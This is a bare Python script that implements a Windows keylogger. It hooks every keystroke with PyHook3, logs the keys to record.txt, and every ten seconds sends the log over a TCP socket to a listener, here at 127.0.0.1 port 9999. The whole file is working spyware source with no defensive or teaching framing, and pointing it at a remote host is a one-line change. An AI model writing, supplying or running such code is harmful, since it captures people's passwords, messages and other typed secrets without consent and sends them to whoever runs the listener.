import socket
import pythoncom
import PyHook3 as pyHook
import time
import threading


def thread_it(func):
    t = threading.Thread(target=func)
    t.setDaemon(False)
    t.start()

def send_record():
        while True:
                with open('record.txt','r') as f:
                        li = f.readlines()
                records = ''.join(li)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(('127.0.0.1', 9999))      
                s.send(records.encode())
                s.close()
                time.sleep(10)

def onKeyboardEvent(event):
    key = event.Key
    with open('record.txt','a+') as f:
        f.write(key+"-")
    return True

def record():
    hm = pyHook.HookManager() 
    hm.KeyDown = onKeyboardEvent 
    hm.HookKeyboard() 
    pythoncom.PumpMessages() 

threading.Thread(target=record).start()
threading.Thread(target=send_record).start()
